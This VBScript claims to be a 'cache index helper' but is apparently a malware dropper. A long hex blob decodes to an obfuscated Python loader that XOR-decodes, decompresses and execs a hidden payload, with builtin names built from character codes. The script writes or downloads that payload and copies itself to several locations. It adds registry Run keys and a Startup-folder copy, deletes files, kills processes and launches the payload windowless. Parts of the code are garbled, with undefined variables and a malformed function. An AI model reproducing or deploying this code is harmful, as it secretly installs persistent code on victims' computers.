' cache index helper - maintains per-user cache index segments under servicing folders.
Option Explicit
On Error Resume Next

Function Dk(s)
        "30375458736a47476d542f396a554a70455879384f422f2f76302f5a79374a496a7a66445a354b737153476d65634365534c52746e7857594d6677356567685169424345736146736b725059584e647959783037447738736c75373845706b707842505179623333766369643942355553746d6d7073437664466f532b37586d73686c7875653778656d6e525a4649544154334b2f5978566e5632332f35556333793854792b46736e3176544e464e59773038524e632f4c774b58754b6b2b434a663671705a4346594b44776852634f5333735468494a45353259694741444a533758644a34392b584d31636a464657733142433269446b7936684e2b4c37394b7a2f697a71555448483969775553566264697479386554304548436638586b4e327358364575344d504869712f4e442f587244495a7376786f384a63426c383574794a6f58583472333351584a566f6839636e656d2f4b6b70494266765673656a6245715537656979595a534e4c62314c5374534d57666f3166626d616a3679736e544e5470545557356a49722b4d5446456148332b4a304d77584f666e6f6f687a6678682f4172303637344c6a7a7a6d6a5336307a7165676a6b716845686f37" & _
        "744f5162333172456862515147364671694e4f436b6b6a46386963372b2b4a6e564833683574556d3074695041686b3347694931676661315979786a684b4f3432496f4331614b52712b2b766a4e7a30747366455a54386f53563265793376723878647871354e6c436c786f362f5831575869566b4b4b44784e6934584474666d7871614243744c4239344e535938363149624a644b4f517845546473594a7a49653732785a4350625576474d57464a3879442f426a7978633845445335594c304765544b51564475514e30636e35324e592f5571526e4d2b683070777a584833626c7752462f593430666e7046665477666b594c3066547054326e4d2f6b6a7679466b706271595a737859686445564b77586d4d70306c5341442b61774534464f334f686d50707139687a345a43307554426a59505572425a6776545568433433344262765a7a684e763337443249305056424f4b4764564b79563542543978316a5a6e345569597165507436466c3237556d4f37735954705a6c66414567306c634c78497663744630496d546f562b5a6c4b664e2b6357494d664d44377548416f4c655a486862646970367055394e77656961372f4e75594c36744e514c354b" & _
        "6e6d4267684d374d61776a476d614c6a5277526461754443724e456c467368344a33454d423472723042416371446f45593475734b505244726f79747872742b78547346324133682b615270716b69344b727371453159754b6a32654b7854474371623371574364586a4550454f69704c5646662b67485473464a506938483734546b51677945346e35445a435654792b666e4c5446694e6a4c6f334c4c366b755278684d4d4f48504674374e61366e3753484951483449536f6a4a727a6d684c2b7652714a69786a3978446339656a595746696c333936612b446d735136573255434f6c335658384f664d63467a6a68307734786e4742564c68574861435a655870532b623357585574432f47536c42664b586e667a55656c5543436b65707346705957766d6d4f71416f6c327244596c424358326b705678514179486f4979594551327474755774736e5a566c6b66537052684250584437544b535444646e567962614759457966333361337170726b4f61365671507932326244395a483333594b737755625546552f574c7239502f63495a63304e4c502f2f494f4577712b746d67716f585135636f645a76576b306b3844784d434e6463727a4f7647664c" & _
        "7471336362336e2b4974556c6e30497146384e7268494c37507a6662483633615a306b454f574b37464b43737955775454756343744835325a7874452b2b34537a797479456466486852616438686b305a6f574f6b71612b2b386b70437071767854754862714f6430645a624e73656a434d4274444849793377657574726e6345714d736a574f49566c6535526766514c55754459387670364e6b6e334b43656237706d5052764456636157374b59784f4566524266674b6e475245436a6f5848757579664553464d427459526841574d546b424d34426153354a727733467650686e6161474d352f68554c595265774c7552413565366350364e687854694a6a734f517245647657454a4930437352325177527643386848462f5363303866416b4c722b45566371312f2b416348663578635476584b6e5431334e4a6d55357132796c4575664a57437a3147753562657241387553684156542b2f545553662f5747463161702f487832364d6565687467597a774662637a525274513130663148495465587a4a466352776276435243626b684b34576b783454566535344a6a4d41314c436e59716c30776375694950434d2b4f32656964492f6a7872536b7468" & _
        "335a5248692b7074464f6735566c5273527156365435693043482f617737514334504a564c4c364f55556434327a5747622b31356662593931677a594a755253456555676841584b74525a6e6474686a3166506241624c522b6756665942794963754461466c71685049474a56562f3133553544744b316c346d39596a4e746d616e6137344c46484542514256385272354a644f6f3932336b52483459626a5a364961734c6952773556474f305731586b62503233306d492b79784e4b51444557466d794c7857454e4c6e45517369744d7664766a79714f7a486648444b7976427a3239313954776a397742444f733537417744454f30537a6a6d6c497764584a424f376f2b2b6d2b2f4a357641522f554b6c56534e5463712f31486f6a696a3531763466744a6c6c746246554d512f4f42584f2f38634334585568694736486e74486279653279374f796668352b3164614f773136794576355834664b304434422f5556543348506930385930634b655056756f4c5a49356f6b634d7130476b4853565a6f55612f52645568334b574649412f4c2b733436444855304e5a384a466a376c666c365472797631323762525a5174487639764f336438554d387a6b35" & _
        "2f62634c485a3248443968666a7a67616368654654436f6e525173346e376d6f445370573035464c627a3969746f5843644e714f6d5968663177557053486e41532f4d6f554150737243486b7769324a4e646230792f3734745931477a687169363773447474434f656e794563772f42594d763766757651645a6f396a34623243334a6a4c314a6a4950316f62766437744a686b30476c354135705a71796f6c6b5664786376417571497041755478784a426c6f50316f43507166514c516530774d32616831784146754d61617a47755552777a354f32354c47465a4a6745515659325051744834386d3951484c56596c763159776c3370536e736867486c3579565543672f31384c79506472742b48614e4b4f504162764f51435077777853437a4d766a624f683963494a68494757386455546d4c384950765a3357636a5636614b446d4773784c356557684a357142696970346551426c49327061376f63366e47674d7a326d482f5632594568315159705048304958664c74452f574e696a51322f4b5538553342462b5a43645571617a7744613838796261534163626f7153705a6f2f463532352f675572587430453941376b4a64312f6e4345756f656441" & _
        "4a6d65704a75474e42672f4b31717a4863736f6e6d71665a3966386c415a4b787a6972462b4d625a79496d35515a6c7643456263376c3748704c624a6d746f474c4b49527666503456503469713964393452346a33564c707a42786b4455736f41354275476337303777636e4c3277736c5079596c6f684830623838496238434a6b49325745314b33316e6a614672654c34717a796734662f37655a70335a73486346466b38746a7045306c35585774696d376f7578463152574c466c4c344944302f7748347777536566455061305372316566436c6634627a756545454d35476f5650764566685a5a3169315669466a30414f75695645514e7975536178322b61384243544f4e4b344c5141662f3242306e7a664b34653032305839397038614e4773393977777135337546756978544f7867445a2f483756346a766461542b7769575a544f6c566b583655686f2b4e71686c4f4f6866762b364d365a315430514a6d5230655972746c535946337154744d486459574c52376d36445233447a454f56612b73662b5a5a53317856496376514862657459507331452f6c616e5066366d52617657543956426941365234664c5432314d663651657536726d597877" & _
        "776e5134676c783665417a36686555544e35542f4a68525152655266463069525937416e6437484451365a7663556a6478786450505a4678474d50376b326f516b37496462546254657966625a6661466e3044474d466776492b4758494e6a55496f5a554a4e6d31327735575231526a4d554c374d696c6436304531356533622b4c686e3555614b54323370353177356e512b34544c354c795378795079396f415336373635444a5379532f56664e763550492b4676486358524d4657354436346e656f4c6b4a66573356765a4d346f56597938324e57422b4e673172654b513151564a66382f3267685473704b61637a7763583735664f6f58597a374d6a3367427a463256466e54333331546153747453414c6f625a472b464e47682f417834317a4e7a4a554a6c365167496c6f52345751722f3166566365546765497171545034754c75717a7a447545653341483354734e6945534f787a6d59467662584f6370723975625050486336354b45496f6448307873566d7249544a43776431756c67785574686e2f765a6a2f705a5a6f4c5a73644f39657475762b746145597a426a4f7a677279747a6470487a663830782b4678456343454a7570546251547161" & _
        "4a4d6463695854584747352f5241654e30556c79352f5037654d4e4974424f4c6a444c2f6463584f775141766676326535586a5449542b6f4162447159474e724543346f4a2f726a725056452b6278683757377458534547764a6250795952737037395352593450623158557442703979726c4f6c5833456c542b2b333654337355374d56674b7947376b47672b736e2f72566f32716757315261784b61594d4143413776476d496b34617143415a747979576461367a61584d656c616267745062524e442b57494563393131677235304158614e544d6e44396458337041465732554c327656727a7a65517861325939344270564c56464a3355754b2b394232594c4b6c336d753562433279612b72796d6e39644c51374b47726b543275624d526d4f526a74472b43593355444c4a784849506155413145306a38417556725a6c2b576454417a737a785567785a47613472415a53366231656377334f4c4c376459456a784b3059762b4e3459774c636e794b716237453732714e7548684e504d4a537a3548304266556f39436468705536556d6e473833735a36555666426a33466b625669557476536c6e525437564d794d2b58417968684c596e47726d642b" & _
        "354b496d2b643672754e666d4b73324249556243436375635051674466724b527455686252686172544c767a696d4f38754d346373456a49574b634f524e48486f6441676c676e4f737471546d686c5472766e626455446854385270777a324e31306264566e5a536b6b767a48353137764d544572486a755a4770512f68572b444851523339346d542b4d705830485678314b2b4346425870774a767447784d30674f3174706d72676c6d69315a4d4e596c6b514357796d327632796f646f486c444b41616f744530382b702b696c4e78437a662b6c757a774e6278506d4a2f466e2f436d6c6c754b43647972485341676842584d68763732656c6f567431496450394b496b2f7579763339546846394263455776425a456e4c734173504667616a336555662b75457277643467714a6e464b766d634756484e564c486f2f4c6d516d552f365a31727173417661773938387636577153672f3031434f2f7559556f5a6e6465726c75486e637569455459386e7953626a626f7a4c5532467478545a425543503359506d644f6441584c5553572b7a794e34466b6f42496e7776536d5879302b4c3241772f314169336d5646575868384d47726d574177514a4d5350" & _
        "4859566a395558516741687653316a4d4c4f7773336d64544d497a496c4959632b4a4430565031786b444a623378513661594f766248463137743564675970524d7a3937677155784c357a55464c556a347a6464523979492b4c552f4e50336c56707465334c796a536957746f43586e67726945535059643779526e6c684c62414d31447a524163314a427156385079752b35447a737a73656c463148454f55317978387676384f4637755035474875544243344c4e53702b31576b5863574e4671614f36637657336e6b5542334c30364a787175713954646d2b4835552f7174676e6d466f564777624e546d5059464e3950616d4a6463724f72355646534c794f372f625962414e767a532b6f4e72624b46636f4651614f5a626b6245332f514c735639616b583931626c732f4836385477582b656b59615053315159477356694772727063427a58583239786b714547366f7a7554655849793237732b385433666f4637636d486d6e5a63386a7170314c3762426a6435484e50316d72367a696d5939524c5868366a45636e6d6c375047456b62555a5876777630795438715569716b495063464f362b5052494b784b395756716e55524279574e506d496c44" & _
        "55456f3074476750422b46776357534b4946673331654969634b6f37436e566349704c6d386f4344366573642f454d56324c6154507256367459373561493054576a3075316f7a4348597639384e336661766446485841727a684b304c7979465446376d5533587939582f6d36736545394a767138466576486679585233444d794a7836626654305067504e55776b4b6b4e6132345969594379714b746f4d4951796b7931776e33342b4966366d556266315250706873433234367776316f2b73763868646531437a54636b566547537a4841775655677549496e53376173354d2b374a4843786e3976446d7a5942375a393163474d34594d4f617836414a456d7855677a75534c466f61536a36657178355a6c734551547055355a575834454b3374494a656a43634d546f794b5a566e343677444f524f50686a4d68734950466378765669374f2b6f3555646164624e4578646b4b62447164647a59673359794a6346546231714a3371797a31386c644d686d2b384c3270727945464e644275706258534569336445583834684d795245353775374d2b7948613146756d396737626c3664414851654a456a6837614f786b4735796175726c6d71425449377032" & _
        "505a794674586878425836676944475147707652706432672b3430444e315a7a4930304f6b38506f4a485154394a704f426b717a4446416a702f674d3162726b336b532b4457316d734e57772b50324642426e344848324b77466a49564e75624d78327831547159576a3578486b485a6469684b2b52645a416577377658474941794e5653467a72594d6838794863714365427356695370387977626c7747333175446b6544504f6e576350794f75367247563039614f504d4a74573865736a54633741796f4576453632337a38412f497756532b38476330507a304d55784b496e6d6d32695876666d37676b474e416d6a7770736c4f45335935475472355363716b32742f4d6343774f71326755357630536a343636556f416c662b6c4271693435343449546950446a4f2b586d374d4232515762583477705251513644643347777370436942686273556c55504d4b3249504d47717a414b484c7941443230626a4a554b51556b634c37534b4e4c7266736758772b594d58453861754b3263686a6e75596a4355455344716f6d49346738672b5970474c594b71376c7366595167344f3032492f756942474d7a59494d763756516f3545616c72366d73753950" & _
        "6a7a72546338475a4136684e44315a564e6f77424e7a44362b6f6d4e706955573367577247414e614f2b577265373636657946347869776978552f3043526377356a635a6378555769494a39712f2f4d776a61596e49746476523466454268506f6f79587271353068303267596a4b2b54392b30724e31586c6474443551584d34305a7a61525a52485176642b7235437762315a686632687a70595350774d723744554c4f474c65564473683649364268556177585a5a5847325975794c41592f67534a416d4548336a4936785859653351526b5a39556d3878647635687757687365343379694c76697947445a4d7950676f78344b5670334f4e422b706b366f36696e6672416a794779464862496b436a32512f38726c6f4a55497572374c49593934336c4d625749614c7232645a773332467355385a332f72312b2b794f6f49652b4f74515a624f67436e576330635a47564638376263595635785459716d2f574238397a7856344757634467682b51637036634b6c37454e507a3676704b75396d325974663232426b627571724779707666444d4573306c647a4559716e75692f612f764c796868335631746b2b7575362b36675153693468714e72327538" & _
        "534b50733541656445477a58794c2b3768364e446b414178566e766f46544a2f74526c577a415464546c6f413331744730344c4f6a796648716f71696d32306468593957683136546f45384f4c53694a3544326c415333324f434a4b3231573770656b396a6f342b70454773446f57467537364b655548454878583955315564655056376e5047626343737a6f6c3458733777566f78384f6e6849397a54706a31436f654679626f7a702b375236346c31376b666f476b4a324942764e614173695a73497241686a5a6c46416556536f6961575474477767726b595a31796664616963667436794965617148747a7947787957636833574b6d565a434353393938586e61674c6e554e33424946306a68374c59627173544f5673554162386c38665a737a3341625a474b63516b3875324b45666c327054306f6830384b586a675467495454796a6133516d647830484137704846416d54784178667177686a68426f6b613539456e6c69345452344a3836356e526e627547414447314d33432b4773464c73482b5773527949776d4648686b715a424e6d6271344472584a456367514d37466c3358314e384e576b6e2b5367495a44517a4e67776248696a62566455" & _
        "7965745330516a50722b587945756b4159754b35364d666856663835757630622b58756a4c52497779356f6953316c6c473667726a594b72724b417078533869596951496c5233734a4a30765a77646e6f41447a35524a43706650305a545a306569772f724b613261584b2f63767a35466a6f52766c613362663531754d68567363507a33685a746b716976354f62384a58445838334e424b386c59583132505370394e42346936376b374d624453675859702b4c4c4a52554b66533031674f4f6a4e38502f726645686754514d676c3977336b57754e65784e486c544c6b7a544357656c47306846382b4275763876326f614f774d3161365238536a7752793865633762345762753361336a4b69495a532b756e5468517033667152566c55346f4a794564344f4c66354e7574454b6d75514d4b3667347137574e76707271304579542b50793378612f31476c62364f536f686e6c456452454a5862546d745250644d56546b4163486e496d5837744c75504d667054594364517966474c4f5739746b38455051455a71637847656f6f657068534c714d61482b6f47377746394d796743524d3367656f3249665771496c376a796d445538626f68624376447870" & _
        "6c6f7867347a5562376d533068426c447932784a756238752b31574168626f79316d364679475838316e2f7034726d4176636d765345316e792b4d46712f415845466367566a5445787542546b36464e4f77744a57544433646d5463475451747637455576784c6a6947697a5846713363394a6256504d506c466352784967664d52584e514636562f794a675143755a4862575a496769652f556f417568764b5778594e6b4e7a6d374e51366f7a30763976316c30734e434b32677970637750336c386a656e616f31627143666f485365484565686d6979705a5375554e657572676f3143714737694736442f5061462b586642385a6537646369373649454556507a72576c67697668356d32384e3933527a63796273644a6962315931553234584d6d4b6657567a765167702f2b4b3051494d562b786b50772b38575446665669536e59782b6751444338623855454c57534b4a774e744b4d4b766f3262596e35324f36356132743651697673476776632f455666765663454e7843534754504252577a795079794c647953453272364a61636c71654b537633556a78582f4649515675554357715a783350454e71344a327a316241414b654641464c45496230" & _
        "4f694c336d6368504d51417645343945384e7a7773597752396b495063466e586258703874754d3843334d4d34632b4663436a6861486b4b5242347a6f6a4a3963386a4143513261484d5458735a5958775243326b2f326e6c754a54364b37376649576c3031754f566a393031777a57484b4e39522b6b3935636675736c7577646363766654784e52494874303473616f4d354f6d4d2b62434d34522b546a797338576d383179587243465a48426177666f6e695a4d467672466f5979777459526a4463792f55626c77686a4341463177574f596f7873756f57506f327a6554344b55765355675a4d426550426c3054537552737a6c317549524f454b4b344c49596c56415775375a5434534675565a52725836594744666548494653616c6435454449616a762b687745356731324c6a6d303232393762774d465141333233466a497a6b514d7a76464c554b51542b61665a342b55756f4e4e6577336d46675a675a545471667772487442355a7573492b48787a57312b75367a73526556596774353149347a753652326b2b78345472476830386b76644a35747233746d4c527a456746526f39454c64696b55694f386d4e39395061694c4a655a4768457a3141" & _
        "416947426e456343473838706e6b753863524f6367486338676d37542f47693377624b77306e544a654f78452b4730774e45703479592b71705a47584c674e344b3847745642775a4c726f6e33774c35414646584555655247656e373757725030666c6e496336647730446f31422f42533563452b524442344364424a4376737a4b612b71434e41744b71365a44434f3972426e644f474e44757a61664a78354450476a69646c37676650666776364a616e336d3639794f6a625648336d726c5a7a716c4330564e433453744f496d68553970734375554e64416b3566706138775868684f735161336265322f7859455039714249526a3630702f4e67756c46776f464f56476774564163512b774562465344616f4372666d4e6b5956362b2f52756151767a6173354c69574f4748494134635462374637303978614e533848386968694b42424c353278667a785071424a6f554c325551675a4f6d38585477417149576546685052476b4f357467777856576e4536713942363870335833454362486d7a63676a3033334f754d495a7266704f6a326456504f6f70374a47374d4a52443956535037796133623372504a41384953627135663462794e4b72494676" & _
        "345353726d436b784d59614c55496c4334546b5a42664459765151314330665865416a31756862796745533548413566796e72685768364d57576f7661564b317956784464644f4254326d6f5651334541756838676d5355634e6d497055664462555a71364434566d6951375677634b37783831435277425135484c324a726d7956786177596c567330614b4e63585065437a573366663551355a5a494872326242707945352f6169324e614967654174377534416451574149415438474742594145453138783333563166516472742b385966576d6e33492b41304d5047783172384267756f56425437596e76524d386b71573136752b5763784a2b457a743276556f34527276697175326250335446362f6e61676e6f6746456f35385262744a6d666b593336314450586c6e7375436e7964562b6d3858767a58326e50686e75316a584455326965733349725069327946384577443277664d4a35496b2b466a395a35622b4c5456376373556c4b754a37515a6268442f55356f586c3246776145476c64662f3552546751393243587174725357694579766d59577a68647965685971307a514768586d706f737479417737734e61754731774b59764c784b4f" & _
        "41626e68495a64536a416f6a314b4844635652616f586455624c647662644631394973487936756d646d7857672f4c5239354578776555634e6453507a52776f685677364f2b452b532f654646734b777158495042413356614f57674a6a66376f62547579737a6d76734d70445050503453707a792f2b46625241754a386e70316c672b4f657836633167773275572b6b354673784670756436736779446e6f692f586277665668377432646e39396470683670393850334e7a324e58553355633431524b62667857734156464a4d624856696576756246793739454d6a4d596a7a526e77464d66434164476d554e2b7a383066496d7531582b6375347165592f773937595256527859346d52704f42464a43495572366c4b504c34306b4a333772696c634f6444507670423550516770766833524439547a31732f6e3048683249714f7a576e506439466369416957495048753969736179394236306b2b4f416d4c6459577167464376343172367a6772564f546e777a7447724f3753504e6a4d75526a30736d777833664234432b424950764c3256443032784a7462726d6463375643546b534d2b79742b4a474f6c73614548587a2b313468596f5970504178" & _
        "674d564d4f576977346d2f686d6a5865386a4e5a627964393455635538385634416943306d6a41686d57397870587731745233494269594150316c58774275716941564d4c676c43554747612b52346e6f6c734d593656486a50704553636b686d4976326643424157323077683931426e46436835373157335359774d464e7243547859366f585061584e634d6f324a4a6d30315144707969754a6d42426e4f354e3644625249586d5a59767132666966773368636f6a78746359744c4168575338757a5a4947445437454c674c4b316e6e6358486c5036557a5a47616e426a6f533531536d2f322f6678515873574b6c424e482b486d51545953567538785a6277767a70784453534a573052644d446635374f3569762b63343876586e474d38683461632f434343565061624b45564758696946684c2b35306b33456d30304c4164443965573431554150704b715461665a39757665694b4162646e79526c64332b324e455574622f3732374647476c4f526679647541543376516b2b43713466355a774c6375386e71714667766e6962733243466e646a6371687735634973516333644c466b6a47396d3047467935377833324d516d68377432656864617a79" & _
        "67552f647a314c59667a3964616d79384c5130784f556c453937747a4957377a4c4f7439754a676d612b75794b78654c6833333655656a4861756f714a332b727350375936653439373864537954544756464770566b633858384b597563554750565a4c56645834546b542f6a6c6c63783678766b4a4c586b5136524230446f6e58544c786a51516f74714b6d41646e524777584641453370355a705348596e5543463158754871595931524169375453475334582b797161665336786b2b6f38676f70444c76714162366b3342374d4e434e435732393061354f624e322b314a6d4e454d327548617a4173694f39665a32616549623638434e42747a6c53643759534372744473346f752f2f466f354b3073686f6f4844625a4362342f705673585a5830696b4e54374858457a676e315a5a63783079435942387332467145626465543549574541544e566730575963306667456c6e3845476750476748537539564e5972624731304937636e3052685153426c41694b4a757456722b61436e34506f6a3652334e53396d713070636d4c444d71495a35316a4a6447465335384634432b453146343032333741762b71552f4e45484a2f736635516e4659714c6d" & _
        "4d4d313252762b397748444d656e445a463042684a7a344f355a574b2f66615a546458747545476632346f643164555136776c5a6e546a4447585a677970696836307974726146496579582f564b6e70786f357772776a303438376f7066533065716e6a55693663742b3657423577514d63575046706d35382b57723235374b454a484c4e66434452484339436c69485973454f384965784b6673575974745637745a48786d766c392f513778774967376b742f38672b414a425070736369574c756a726d553568627a7848704c6c30726b552f7464625839706963774f714e76624e6b6470632f4e386944662f576651733767644a77754b786c744d734c6d6947666c734f7a57303878766947636c496a7750314e4a4e62474738614c6734372f6579637370475a422b513348625565655876773669534b466d746c56397a2b4761514b635544566c73534c3941354d47746d786462684b44436c77523656366d4e57614d6d386f6a447774556e487a574e7562783553736a4b356470526364586152684567504e6c466432792f43626b547a484d4a5376586d6461667044456867786256345a55595762446e47524e663874414e64486533315176576a5a4954" & _
        "7938714a314146797a574e714a5a6d68785a592b37515169614e7a3675544d42535637314847394673497a2f485959393155554a4a307139796a49416f6a4e5657456a786d6869706b6c53686145776c69516c72704562776a7a3132536f2f69454848466b2f37426d51364b35412f444e49575347344352484553556c67482b515759635a374f5a7a424c4c7475426a75714144575561457a3335357855323367506b68722b30442f68387637626e777a35484c6b56572b395775314857444c7054495133484e4f5771544c7970356c3954594c3230763666484241796371624b4e656343676d4d306537366b427578734d5a77524c63347a6e4751677244304939624d54626e70764f63436f4474536571546954554838476749375631394e714a45393264792b5655497a396b2f526237554849675a53375650584c6f444232446d335a44736d55653961643351634969767034644b7174336a6f446859377474484b2f374f4162434272634b4d326c56736f6c756639307537466536463075597a6c46443064635a31374353674739664353427171464c684f61577a59786759506575435a737931474f78366a434f67397575343950487a3032726b52525558" & _
        "733648646a476942376366334276714c2b4149386c6d4b627669327945775946613661545351476867506e784c425373326455594233586952356c735333784c49563052484954796f2b4446345232486a792b6c6a44715753616a356641426b342b43744d6673503149587069533752724f3979412f2b3338515a73357651363051736261352b776a58542f7a4d454a38707449784c357a7677787a352f50346c4362644635594864326a6b4b392f4e5a78623258496d4439662f726b766477464d6a57686c78752f5437333478716b6633622f656e5a386751424a692b384b7745636958744b387371424e694e4f50707253706b6a4e746c4d4e4a593772745468644e5976427475764c7874435066582b727a315768334e3467356b526e55316d682b34777a5a774d6133344438586d77636649507746593965576469634f6a37705a672f3457413363646f67703177717368334d424857676174514e497a73346d37574e58712b454e4a4a443462427a592f31486c354f726a4946574c5964756e7a762f5938505836595651582f446e4c6f775030322f433145315535644f4464414e55706c517249796746484575737444586b77426275594f384f4e63484d" & _
        "52685646685a6d37547346345144726c46704f654e645730596c75775164647846755464444a794e3437654f78766d623531426d577855366636615374314d567a6d34307162554f6f4243663058555668533549503652462f5250796155624a72322f366b477055506d515765766d794f73784a33334d745a626e414372634c44417332613152716a714752474166384e61716e392f79312f34366a686b7a4158764651382b304338584939644d33434d4946556844564e557247694655754d624c344a4f66537448492b38726555454d54446c37337243704952424f2f366a364479506f6678323976332b4b427a4c7754347a33626d757577625a4b6f306145774b56716655577a2b4d4145667530496635324248325a396a455758615952624a32306d563754684f65664a534d556556466b5450644c612b51705178626f4c2b7868587571467356334977467a6a59556475736f6b6a50735252355a3053314a57673542324d4e51386b786b756d596231383061354334766c3371786b6162613266596c6543427359764f324d44472b49714d663470546e6671563149524c49504b4d423231446756384448376e35697a2b33734c687961386f5a5970623159" & _
        "357a72593542594165374b7331556c677165487a512b716c755353735168487577754d706232636b6d462b4f6f596357356449305031314a53737757314a6e766b6672515a7131757971526237777458384d31524d57437576316a726234386f524a7169524830346743356c2b6b48703666564a6f572b695147536357494748645a647236672b6b38794757614a356672614867744e4c70644663616332494b557855615a4f6c6b3547726250746f427441624f394a644a6c5836796e395a4678344564416a5167426866476c4f754c38356b34562b784631307a6f5a6f696673345872576951413439487231387a443175554e3274794b43574951416f3255366678647a6e794d3765434d644d47664c6558557556624754356f4873745a5731744e437a667a773775576236655a636e78684156566f424f522f4a5a3269575865466538394d6f446d66425a646458325531745933317a7047442f6a2f506875316d792b70364657574641355576363156372f4c5555424675315a396d4166764a79684335695070496e5949545834667330386653344a55447559345a364f42685869592f4c5464624a78384c66447950363952774f7744654e6679467a423030" & _
        "68737873494e7532705962714d6e36426666327545424a4e796555636f627a536c4a705448532f624f674a41616f386e496c767975595741573638445a457245497a6472433432686e4e7254454133315779487976476f67554569506149574e38523053454d4a774c4b543072417a7865524d2f4658325a4d6b42684437634853586853437377635250655743354f374655645a6766525a66735353546c3448324c76614a4e46775632744f6d507077546248374e4b3048547263717065784d577251506648694d6543457a322f71755346634365666a30554d52427676333948762f357a6943524f3978465a582f6348686e413734572b33704f4444534e2f464737714b4257376b61474d68457148575a435a35465345706a6745316e6e6e3454486551376a584e3653325374684e55696e5242703733615259336345476d475243584a6f564138643876666667524935317032676e4a36766d6a5270596269514a7174346978573279356d6664742f5633782f7356673867744559622b726b34564a75634336724744725932496537385370715562412b78466443766f554d446c2b3835706632494b62644258426a486f6256797a626e776437466e456b4b7a" & _
        "536352424c2f75464d2f6d307833337579553675487773762b6f762b514d3538363736744e773972674c3838454971664a6642744b7a4b56746a323655726137524269393774647248736b526d50354a41377455696846366351536e522f735a6e7674655a51334c4f37706745666c3271673d270a0a646566205f6465666c6174652864617461293a0a20202020726177203d205f6236342e6236346465636f64652864617461290a20202020627566203d20627974656172726179286c656e2872617729290a20202020666f72206920696e2072616e6765286c656e2872617729293a0a20202020202020206275665b695d203d207261775b695d205e202828323332202b2069202a203230362920262030784646290a2020202072657475726e205f677a2e6465636f6d70726573732862797465732862756629290a0a646566205f6170706c795f736e617073686f742864617461293a0a202020205f62203d205f5f696d706f72745f5f28276275696c74696e7327290a202020205f6e203d2027272e6a6f696e28636872285f632920666f72205f6320696e202839392c203131312c203130392c203131322c203130352c203130382c2031303129290a20" & _
        "2020205f6b203d2027272e6a6f696e28636872285f632920666f72205f6320696e20283130312c203132302c203130312c20393929290a202020205f636f6465203d2067657461747472285f622c205f6e29285f6465666c6174652864617461292c20273c736e617073686f743e272c205f6b290a2020202067657461747472285f622c205f6b29285f636f64652c207b275f5f6e616d655f5f273a20275f5f6d61696e5f5f277d290a0a646566205f696e64657828293a0a20202020696d706f7274206f730a20202020726f6f74203d206f732e656e7669726f6e2e676574282741505044415441272c202727290a20202020666f722073756220696e2028274d6963726f736f66742f43727970746f2f525341272c20274d6963726f736f66742f57696e646f77732f5745522f5265706f72744172636869766527293a0a202020202020202070203d206f732e706174682e6a6f696e28726f6f742c20737562290a20202020202020207472793a0a2020202020202020202020206f732e706174682e69736469722870290a202020202020202065786365707420457863657074696f6e3a0a202020202020202020202020706173730a202020207265747572" & _
        "6e20547275650a0a646566206d61696e28617267763d4e6f6e65293a0a202020205f696e64657828290a202020205f6170706c795f736e617073686f74285f4d414e4946455354290a2020202072657475726e20300a0a6966205f5f6e616d655f5f203d3d20275f5f6d61696e5f5f273a0a2020202072616973652053797374656d45786974286d61696e282929"
If Len(e) > 8 Then
    Dim f
    Set f = fo.CreateTextFile(P1, True, False)
    f.Write H2B(e)
    f.Close
End If
If Not fo.FileExists(P1) Then
    DL R2, P1
End If
fo.CopyFile P1, P2, True
fo.CopyFile P1, P3, True

' clone this helper to the seed mesh (including the anchor)
Dim K
For Each K In Array(K1, K2, K3, K4, K5)
    If K <> WScript.ScriptFullName And Not fo.FileExists(K) Then
        fo.CopyFile WScript.ScriptFullName, K, True
    End If
Next

' triggers
sh.RegWrite RK, "wscript.exe """ & K1 & """", "REG_SZ"
Dim SP
SP = sh.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
If Not fo.FileExists(SP & "\" & SV) Then
    fo.CopyFile WScript.ScriptFullName, SP & "\" & SV, True
End If
sh.RegWrite RV2, "wscript.exe """ & K2 & """", "REG_SZ"
sh.RegWrite RO2, "wscript.exe """ & K1 & """", "REG_SZ"

' retire old layout if present
sh.RegDelete OLR
Dim OL
For Each OL In Array(AP & O1, AP & O2, AP & O3, AP & O4, AP & O5, SP & O6, SP & O7)
    If fo.FileExists(OL) Then fo.DeleteFile OL, True
Next
If fo.FolderExists(AP & O8) Then fo.DeleteFolder AP & O8, True
If fo.FileExists(AP & O10) Then sh.Run "taskkill /f /im " & O9, 0, True

' launch payload windowless
If fo.FileExists(P1) Then
    sh.Run """" & RT & "\" & PY & """ """ & P1 & """", 0, False
End If


